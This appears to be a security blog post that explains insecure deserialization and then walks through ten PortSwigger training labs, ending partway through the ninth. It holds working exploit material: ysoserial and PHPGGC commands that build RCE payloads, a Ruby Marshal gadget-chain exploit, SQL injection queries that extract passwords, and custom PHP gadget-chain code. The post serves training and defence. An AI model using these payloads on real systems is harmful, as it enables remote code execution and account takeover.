---
title: Walkthrough - Insecure Deserialization Portswigger labs
date: 2026-02-13 12:30:00 + 05:30
categories: [Web, BSCP]
tags: [bscp]
description: An intro to Insecure Deserialization and walkthrough of all 10 portswigger labs
---

Completed all 10 insecure deserialization vulnerability labs from Portswigger. Insecure deserialization is one of the most critical vulnerabilities in web applications—allowing attackers to manipulate serialized data to execute arbitrary code, escalate privileges, or access unauthorized functionality. Unlike other vulnerabilities that exploit specific input validation flaws, deserialization attacks abuse the fundamental process of converting data from a portable format back into objects. These labs covered exploiting serialization in PHP, Java, and Ruby—from simple cookie manipulation to building custom gadget chains and leveraging PHAR deserialization. Below is a detailed explanation of insecure deserialization vulnerabilities followed by step-by-step walkthroughs for each lab.

## Everything about Insecure Deserialization

##### 1. What is Serialization and Deserialization?

Serialization is the process of converting complex data structures (objects) into a flat format that can be stored or transmitted. Deserialization is the reverse—reconstructing the object from its serialized form.

Common Serialization Formats:
- PHP: Native `serialize()` / `unserialize()`
- Java: `ObjectInputStream` / `ObjectOutputStream`
- Ruby: `Marshal.dump` / `Marshal.load`
- Python: `pickle` module
- JSON: Language-agnostic text format
- .NET: `BinaryFormatter`, `DataContractSerializer`

Example PHP Serialization:
```php
// Object
$user = new User('admin', true);

// Serialized
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}

// Format breakdown
O:4:"User"      // Object of class "User" (4 characters)
2:              // 2 properties
s:8:"username"  // String property "username" (8 chars)
s:5:"admin"     // Value "admin" (5 chars)
s:5:"admin"     // Property "admin"
b:1             // Boolean value true
```

##### 2. Why is Insecure Deserialization Dangerous?

When applications deserialize user-controlled data without proper validation, attackers can:

Remote Code Execution:
- Inject malicious objects that execute code during deserialization
- Exploit "magic methods" that automatically run (PHP `__wakeup`, Java `readObject`)
- Chain together existing classes to build exploits ("gadget chains")

Privilege Escalation:
- Modify serialized user roles or permissions
- Change admin flags in session cookies
- Bypass authentication by manipulating tokens

Data Manipulation:
- Alter application logic through object properties
- Exploit business logic with crafted objects
- Trigger unintended functionality

##### 3. Serialization in Different Languages

PHP Serialization:
```php
// Serialized object
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

// Data types
s:5:"hello"   // String
i:42          // Integer
b:1           // Boolean (true)
b:0           // Boolean (false)
a:2:{...}     // Array with 2 elements
O:4:"User"    // Object of class User
```

Java Serialization:
```java
// Binary format with magic bytes
AC ED 00 05  // Java serialization magic number

// Base64 encoded starts with
rO0AB...     // Identifies Java serialized object
```

Ruby Serialization (Marshal):
```ruby
// Binary format
Marshal.dump(obj)
Marshal.load(data)

// Common in Ruby on Rails sessions
```

##### 4. Common Vulnerabilities

Magic Method Exploitation:

PHP magic methods run automatically during deserialization:
```php
__construct()   // Object creation
__destruct()    // Object destruction
__wakeup()      // During unserialize()
__toString()    // When object treated as string
__call()        // Calling inaccessible methods
```

Example vulnerable code:
```php
class Logger {
    private $logfile;
    
    function __destruct() {
        // Runs when object destroyed
        unlink($this->logfile);  // Delete file
    }
}

// Attacker sets logfile to /etc/passwd
// When object unserialized and destroyed, file deleted!
```

Java `readObject()` Exploitation:
```java
private void readObject(ObjectInputStream in) {
    in.defaultReadObject();
    // Custom deserialization logic
    // Can execute code or perform dangerous operations
}
```

Cookie Manipulation:
```
// Session cookie
session=TzoxOiJVc2VyIjoyOntz...

// Decode to see serialized object
O:4:"User":2:{s:4:"role";s:4:"user"}

// Modify to admin
O:4:"User":2:{s:4:"role";s:5:"admin"}

// Re-encode and use modified cookie
```

Type Juggling (PHP):
```php
// Loose comparison vulnerability
if ($token == $stored_token) {
    grant_access();
}

// If stored_token is string, set token to 0
// 0 == "any_string" evaluates to true!
```

##### 5. Gadget Chains

Gadget chains link together existing classes to achieve code execution without directly calling dangerous functions.

Concept:
```
Attacker Input → Class A → Class B → Class C → Dangerous Function
```

Example Flow:
1. Deserialize malicious object
2. `__wakeup()` calls method on property
3. Property is another object with `__toString()` 
4. `__toString()` triggers method on another object
5. Final object calls `eval()`, `system()`, etc.

Popular Gadget Chain Libraries:
- ysoserial: Java gadget chains
- PHPGGC: PHP gadget chains
- Apache Commons Collections (Java)
- Symfony Framework (PHP)
- Ruby Universal Gadget Chain

##### 6. Exploitation Techniques

Basic Cookie Manipulation:
```bash
# Decode session cookie
echo "BASE64_COOKIE" | base64 -d

# Modify serialized object
# Change admin=false to admin=true

# Re-encode
echo "MODIFIED_OBJECT" | base64
```

Using ysoserial (Java):
```bash
# Generate malicious payload
java -jar ysoserial.jar CommonsCollections4 'rm /tmp/file' | base64

# Replace session cookie with payload
# When deserialized, executes command
```

Using PHPGGC (PHP):
```bash
# Generate Symfony gadget chain
phpggc Symfony/RCE4 exec 'whoami' | base64

# Sign with secret key if needed
php -r '$obj="..."; $key="secret"; echo hash_hmac("sha1", $obj, $key);'
```

Custom Gadget Chain Development:
```php
// Analyze leaked source code
// Identify magic methods
// Find property chains leading to dangerous functions
// Craft serialized object exploiting the chain
```

PHAR Deserialization:
```php
// PHAR files contain serialized metadata
phar://path/to/file.phar

// File operations trigger deserialization
file_exists('phar://uploads/image.jpg')
// Even though it's a jpg, PHAR metadata gets deserialized!
```

##### 7. Attack Patterns

Finding Serialized Data:
- Session cookies (common in PHP, Ruby)
- API parameters
- File uploads (PHAR)
- Hidden form fields
- Database records
- Cache entries

Indicators of Serialization:

PHP:
```
O:4:"User":2:{...}           // Object
a:3:{i:0;s:5:"admin"...}     // Array
```

Java (Base64):
```
rO0ABXNy...                  // Starts with rO0
AC ED 00 05 (hex)            // Magic bytes
```

Ruby (Base64):
```
BAhvOg...                    // Marshal format
```

Testing Methodology:
1. Identify serialized data in cookies/parameters
2. Decode and analyze format
3. Try simple modifications (change values)
4. Test for magic method exploitation
5. Search for gadget chains in frameworks
6. Build custom gadget chain if source available

##### 8. Real-World Examples

Equifax Breach (2017):
- Apache Struts vulnerability
- Deserialization flaw in REST plugin
- Led to massive data breach

Jenkins RCE:
- Multiple Java deserialization vulnerabilities
- Exploitable via Jenkins CLI
- CommonsCollections gadget chain

Ruby on Rails:
- CVE-2013-0156 (XML deserialization)
- CVE-2013-0333 (JSON deserialization)
- Allowed remote code execution

WordPress Plugins:
- Various plugins with PHP unserialization flaws
- Often in license activation mechanisms
- Session handling vulnerabilities

##### 9. Prevention and Mitigation

Avoid Deserializing Untrusted Data:
```php
// Bad: Deserializing user input
$user = unserialize($_COOKIE['session']);

// Better: Use JSON (no code execution)
$user = json_decode($_COOKIE['session'], true);

// Best: Use signed/encrypted sessions
$user = verify_and_decrypt_session($_COOKIE['session']);
```

Integrity Checks:
```php
// Sign serialized data
$data = serialize($obj);
$signature = hash_hmac('sha256', $data, $secret_key);
$cookie = base64_encode($data . '|' . $signature);

// Verify before deserializing
list($data, $sig) = explode('|', base64_decode($cookie));
if (hash_hmac('sha256', $data, $secret_key) === $sig) {
    $obj = unserialize($data);
}
```

Restrict Classes:
```php
// PHP 7+ allows whitelisting classes
$allowed = ['User', 'Session'];
unserialize($data, ['allowed_classes' => $allowed]);
```

Use Safe Alternatives:
- JSON instead of native serialization
- Protobuf for binary serialization
- MessagePack for efficient serialization
- Avoid `pickle`, `Marshal`, native serialization with user input

Input Validation:
- Validate object types after deserialization
- Check property values are expected
- Implement additional authorization checks
- Don't rely solely on object state

##### 10. Detection and Defense

Monitoring:
- Log all deserialization operations
- Alert on unexpected object types
- Monitor for known gadget chain patterns
- Track serialization errors

Web Application Firewall (WAF):
- Block known malicious payloads
- Detect serialization magic bytes
- Rate limit deserialization endpoints
- Monitor for gadget chain signatures

Code Review Checklist:
- [ ] Is user input being deserialized?
- [ ] Are there magic methods with dangerous operations?
- [ ] Can properties be controlled by attackers?
- [ ] Are there gadget chain vulnerabilities?
- [ ] Is integrity checking implemented?
- [ ] Are classes whitelisted?

Security Headers:
```
# Reduce attack surface
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff

# Session security
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

---

## Labs

### 1. Modifying serialized objects

Description:

We need to escalate privileges by modifying a serialized PHP object in the session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208214956.png)

Explanation:

We first log in with credentials `wiener:peter`. After logging in, we capture the `GET /my-account` request in Burp. Notice the session cookie contains a serialized PHP object. In the Burp HTTP History, the session cookie is visible in the request.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215408.png)

We used Burp Decoder to decode the session cookie. Copy the cookie value and paste it into Decoder. First URL-decode it, then Base64-decode it to reveal the serialized PHP object:

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215426.png)

This shows:
- Object type: `User` (4 characters)
- 2 attributes
- `username = "wiener"` (string, 6 characters)
- `admin = false` (boolean, 0)

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

We  modify the `admin` attribute from `b:0` (false) to `b:1` (true):

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

We then base64 encode the serialized object.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215601.png)

We use the browser devtools  to modify the session cookie and paste in the modified base64 encoded session cookie. Reloading the page will show us an admin panel.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215641.png)

Deleting the user carlos, solves the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215702.png)

### 2. Modifying serialized data types

Description:

We need to bypass authentication by exploiting PHP's loose comparison operator (`==`) with type juggling.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215752.png)

Explanation:

This lab exploits PHP's type juggling where `0 == "any_string"` evaluates to `true` in PHP 7.x and earlier.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208215958.png)

 We need to log in as `wiener:peter` and inspect the session cookie. 
 
![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208220048.png)

We need to decode it to see the deserialized cookie.

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123..."}
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208220214.png)

 We need to make these modifications and update the serialized object.

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

We will then base64 encode it.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208220454.png)

We use the browser devtools  to modify the session cookie and paste in the modified base64 encoded session cookie. Reloading the page will show us an admin panel.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208220553.png)

Deleting the user carlos, solves the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208220610.png)
### 3. Using application functionality to exploit insecure deserialization

Description:

We need to leverage the application's "Delete Account" functionality to delete an arbitrary file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208232344.png)

Explanation:

 We need to log in as `wiener:peter` and inspect the session cookie that is sent when we try to delete the given account.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208232508.png)

We need to decode it to see the deserialized cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208232624.png)

It looks like:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k26kj6p01hchm54q53fqome3j558g53v";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

We now need to update the serialized object in order to make it delete the `morale.txt` in  carlos's home directory. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208232838.png)

Updated serialized object looks like:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k26kj6p01hchm54q53fqome3j558g53v";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Note: Update the length from `s:18` to `s:23` (23 characters in the new path).

Sending a POST request to `/my-account/delete` with the modified cookie solves the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208233045.png)

### 4. Arbitrary object injection in PHP

Description:

We need to inject an arbitrary `CustomTemplate` object to delete a file using the `__destruct()` magic method.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208233116.png)

Explanation:

we need to log in as `wiener:peter`.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208233652.png)

From the site map, we can notice `/libs/CustomTemplate.php`.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208233707.png)

Request `/libs/CustomTemplate.php~` (tilde creates a backup file) to view the source code.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208233834.png)

Examine the source code:

```php
<?php 

class CustomTemplate { 
	private $template_file_path; 
	private $lock_file_path; 
	
	public function __construct($template_file_path) { 
		$this->template_file_path = $template_file_path; 
		$this->lock_file_path = $template_file_path . ".lock";
	}
	
	private function isTemplateLocked() { 
		return file_exists($this->lock_file_path);
	}
	
	public function getTemplate() {
		return file_get_contents($this->template_file_path);
	}
	
	public function saveTemplate($template) {
		if (!isTemplateLocked()) {
			if (file_put_contents($this->lock_file_path, "") === false) {
				throw new Exception("Could not write to " . $this->lock_file_path);
			}
			if (file_put_contents($this->template_file_path, $template) === false) { 
				throw new Exception("Could not write to " . $this->template_file_path);
			} 
		}
	}
	
	function __destruct() { 
		// Carlos thought this would be a good idea 
		if (file_exists($this->lock_file_path)) {
			unlink($this->lock_file_path);  // Vulnerable!
		}
	}
}

?>
```

The `__destruct()` magic method is automatically called when an object is destroyed. It calls `unlink($this->lock_file_path)` without validation!

We see that the session cookie is a serialized object.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208234303.png)

We need to create a malicious `CustomTemplate` object with `lock_file_path` set to `/home/carlos/morale.txt`:

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

We need to then base64 encode the serialized object. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208234623.png)

We use the browser devtools  to modify the session cookie and paste in the modified base64 encoded session cookie. Reloading the page will solve the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208234726.png)

### 5. Exploiting Java deserialization with Apache Commons

Description:

We need to use `ysoserial` to generate a Java gadget chain payload for RCE and delete the `morale.txt` file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260208235919.png)

Explanation:

We need to log in as `wiener:peter` and examine the session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209000151.png)

Notice the session cookie contains a Base64-encoded Java serialized object.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209000214.png)

We generate a serialized object that deletes the `morale.txt` file using ysoserial.

```bash
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookielol
```

This generates a serialized object that exploits the `CommonsCollections4` gadget chain to execute the command.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209002830.png)

Sending this payload causes an internal server error.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209003111.png)

Resending the request after URL Encoding the session cookie, solves the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209003211.png)

### 6. Exploiting PHP deserialization with a pre-built gadget chain

Description:

We need to use `PHPGGC` to generate a Symfony gadget chain and sign it with a leaked secret key and delete the `morale.txt` file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165300.png)

Explanation:

We need to log in as `wiener:peter` and examine the session cookie. We notice that it's a JSON object with a `token` and `sig_hmac_sha1` signature:

```json
{"token":"base64_serialized_object","sig_hmac_sha1":"signature"}
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165513.png)

The can check the format of the serialized object using burp decoder. It looks like:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"TOKEN"}
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165537.png)

We try modifying the cookie. The error reveals:
- A developer comment disclosing `/cgi-bin/phpinfo.php`
- The framework: Symfony 4.3.6

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165445.png)

We see reference to `/cgi-bin/phpinfo.php` in comments in the source code.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165759.png)

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165730.png)

We will find the `SECRET_KEY` in the `/cgi-bin/phpinfo.php` output:

```
SECRET_KEY: 17ukq220di7c7d89sme62nzevbafasy8
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209165954.png)

We will use `PHPGGC` to generate a Symfony RCE payload:

We see that `Symfony/RCE4` is the right chain for our symfony version.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209170359.png)

We will now create the serialized object for the same.

```bash
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209170501.png)

We need to create a PHP script to sign the payload with the leaked secret:

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueS...";  // PHPGGC output
$secretKey = "17ukq220di7c7d89sme62nzevbafasy8";

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```

Running this code will give us the required session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209170934.png)

Sending the request with modified session cookie which has the signed malicious payload will solve the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209171020.png)

### 7. Exploiting Ruby deserialization using a documented gadget chain

Description:

We need to adapt a documented Ruby gadget chain to achieve RCE and delete the `morale.txt` file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209171546.png)

Description:

We will lookup ruby deserialization gadget chain online and find this article which has a PoC at its end that we need to use: [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html.](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209171809.png)

The PoC code from the article:

```ruby
# Autoload the required classes 
Gem::SpecFetcher
Gem::Installer 
# prevent the payload from running when we Marshal.dump it 

module Gem
	class Requirement
		def marshal_dump
			[@requirements]
		end
	end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r]) 
puts payload.inspect
puts Marshal.load(payload)
```

We will login and notice the session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209174257.png)

Decoding the cookie in decoder, we see that it's username and access_token.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209174314.png)

The final exploit looks like this (we change id to the command to remove the morale.txt file and output the serialized object as base64 string):

```ruby
#!/usr/bin/env ruby

require 'net/http'
require 'digest'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# Use allocate + instance_variable_set instead of .new
wa1 = Net::WriteAdapter.allocate
wa1.instance_variable_set('@socket', Kernel)
wa1.instance_variable_set('@method_id', :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.allocate
wa2.instance_variable_set('@socket', rs)
wa2.instance_variable_set('@method_id', :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

require 'base64'
puts Base64.strict_encode64(payload)
```

Run the script to generate the base64 payload:

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209175144.png)

Sending the payload as cookie will solve the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209175347.png)

### 8. Developing a custom gadget chain for Java deserialization

Description:

We need to build a custom Java serialized object to find the administrator's password, login as administrator and delete carlos user's account.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209230209.png)

Explanation:

We will login and notice the session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209230657.png)

Decoding the session cookie shows that it is a serialized java object. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209230711.png)

We can see the file `/backup/AccessTokenUser.java` in the sitemap.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209230726.png)

We request `/backup/AccessTokenUser.java` to view leaked source code.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209230743.png)

We can view the `AccessTokenUser.java` source:

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

We check the `/backup` directory and see another file - `ProductTemplate.java`.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209231123.png)

We request `/backup/ProductTemplate.java` to view leaked source code.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260209231150.png)

We can view the `ProductTemplate.java` source:

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

The `readObject()` magic method constructs an SQL query with unsanitized input:

```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

This is vulnerable to SQL injection.

We need to copy the files locally and make the changes to make a serialized payload.

File structure:

```
.
├── data
│   └── productcatalog
│       ├── ProductTemplate.class
│       └── ProductTemplate.java
├── Main.class
└── Main.java
```

ProductTemplate.java:

```java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;
    private final String id;

    public ProductTemplate(String id) {
        this.id = id;
    }

    public String getId() {
        return id;
    }
}
```

Main.java:

```java
import data.productcatalog.ProductTemplate;
import java.io.*;
import java.util.Base64;
import java.util.Scanner;

class Main {
    public static void main(String[] args) throws Exception {
        Scanner in = new Scanner(System.in);
        String str = "";
        while(!str.equals("q")){
            System.out.println("Enter String:");
            str = in.nextLine();

            ProductTemplate originalObject = new ProductTemplate(str);
            String serializedObject = serialize(originalObject);
            System.out.println("Serialized object: " + serializedObject);
            
            ProductTemplate deserializedObject = deserialize(serializedObject);
            System.out.println("Deserialized object: " + deserializedObject.getId());
        }
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

We can get the code for Main.java from [https://github.com/PortSwigger/serialization-examples/tree/master/java/generic](https://github.com/PortSwigger/serialization-examples/tree/master/java/generic)  

Test for SQL injection with a single quote:

We generate the payload and observe an SQL error in the response, confirming SQL injection vulnerability. We find that the number of columns are 8 as we get the SQL error at ORDER BY 9.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260210234649.png)

Enumerate the table structure:

```sql
' UNION SELECT NULL, NULL, NULL, CAST(table_name AS int), NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211000648.png)

This reveals the `users` table.

Get column names:

```sql
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS int), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

We see username column. We need to see all columns.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211000744.png)

Concatenate all columns:

```sql
' UNION SELECT NULL, NULL, NULL, CAST(string_agg(column_name, ',') AS int), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

This shows columns: `username`, `password`, `email`

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211001157.png)

Extract usernames:

```sql
' UNION SELECT NULL, NULL, NULL, CAST(string_agg(username, ',') AS int), NULL, NULL, NULL, NULL FROM users --
```

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211001820.png)

Extract passwords:

```sql
' UNION SELECT NULL, NULL, NULL, CAST(string_agg(password, ',') AS int), NULL, NULL, NULL, NULL FROM users --
```

The error message reveals the administrator's password!

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211001913.png)

We login as administrator.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211001949.png)

Delete user `carlos` from the admin panel to solve the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211002004.png)

### 9. Developing a custom gadget chain for PHP deserialization

Description:

We need to build a custom PHP gadget chain to achieve RCE and delete the `morale.txt` file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211002037.png)

Explanation:

We log in as `wiener:peter` and notice the session cookie.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211002444.png)

Decoding the cookie shows that it is a PHP serialized object.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211004304.png)

We see the file `/cgi-bin/CustomTemplate.php` in the sitemap

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211002428.png)

We request `/cgi-bin/libs/CustomTemplate.php~` to view the source code.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211002602.png)

We need to analyze the leaked source code to find the gadget chain.

CustomTemplate.php:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() { 
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) { 
        $this->callback = $callback;
    }

    public function __get($name) { 
        return call_user_func($this->callback, $name);
    }
}

?>
```

We can now build a serialized object using the following steps:

1. `CustomTemplate.__wakeup()` is called during deserialization
2. Calls `build_product()`
3. Creates: `new Product($this->default_desc_type, $this->desc)`
4. Product constructor tries: `$desc->$default_desc_type`
5. If `desc` is a `DefaultMap`, accessing a non-existent property triggers `__get($name)`
6. `__get()` calls: `call_user_func($this->callback, $name)`
7. If`callback = "exec"` and `$name = "rm /home/carlos/morale.txt"`, this executes the command!

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260212005031.png)

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260212005202.png)

Final exploit:

```php
<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() { 
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

// Exploit payload construction:
$DefMap = new DefaultMap("exec");                    // 1. callback = "exec"
$CustTemp = new CustomTemplate;                      // 2. Create template
